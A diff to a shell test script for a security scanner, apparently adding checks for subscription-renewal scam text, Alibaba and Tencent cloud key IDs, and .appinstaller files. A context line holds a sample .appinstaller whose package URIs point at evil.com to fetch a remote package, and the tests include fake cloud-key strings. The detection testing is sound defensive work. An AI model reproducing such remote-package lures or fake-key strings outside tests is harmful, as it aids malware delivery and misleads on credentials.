@@ -9497,7 +9497,7 @@ printf 'hostname core\ninterface g0/0\n' > "$XDIR/clean.cfg"
 # file: .appinstaller remote Uri (F43 extension)
 printf '<?xml version="1.0"?><AppInstaller Uri="http://evil.com/x.appinstaller" Version="1.0"><MainPackage Name="a" Publisher="b" Version="1" Uri="http://evil.com/x.msix"/></AppInstaller>\n' \
     > "$XDIR/x.appinstaller"
-./hlse_core file "$XDIR/x.appinstaller" 2>&1 | grep -qE 'ALERT|BLOCK' \
+./hlse_core file "$XDIR/x.appinstaller" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
     && check "file: .appinstaller remote Uri flagged" "0" "0" \
     || check "file: .appinstaller remote Uri flagged" "0" "1"
 printf '<?xml version="1.0"?><AppInstaller Uri="x" Version="1.0"/>\n' \
@@ -10841,6 +10841,22 @@ for e in fon fnt pfa pfb bdf pcf snf; do
         || check "file: .$e font carrier flagged" "0" "1"
 done
 rm -rf "$XDIR126"
+
+# ── cycle-127: renewal scams + cloud IDs + .appinstaller ──
+check_text_hit 'your subscription will renew automatically cancel this order' 'LOG' "text: renewal-scam flagged"
+check_text_hit 'your antivirus subscription has expired call to cancel' 'ISOLATE' "text: antivirus-renewal flagged"
+check_text_hit 'click allow to confirm you are not a robot' 'BLOCK' "text: click-allow flagged"
+check_text_hit 'the subscription renewal was processed normally' 'OK' "text: benign renewal clean"
+LB="LTAI"; LB="${LB}5tH1q9d8K7m2N4vB6xZa"
+check_secret_hit "$LB" 'Alibaba Cloud AccessKey ID' "secret: LTAI alibaba flagged"
+AK="AKID"; AK="${AK}z8krbsJ5yKBZYpn74WFkmLPx3vT9uM2n"
+check_secret_hit "$AK" 'Tencent Cloud SecretId' "secret: AKID tencent flagged"
+XDIR127=$(mktemp -d /tmp/hlse127.XXXXXX)
+printf 'x\n' > "$XDIR127/t.appinstaller"
+./hlse_core file "$XDIR127/t.appinstaller" 2>&1 | grep -q "LOG" \
+    && check "file: .appinstaller flagged" "0" "0" \
+    || check "file: .appinstaller flagged" "0" "1"
+rm -rf "$XDIR127"
 
 # ─── results ────────────────────────────────────────────────────────────
 
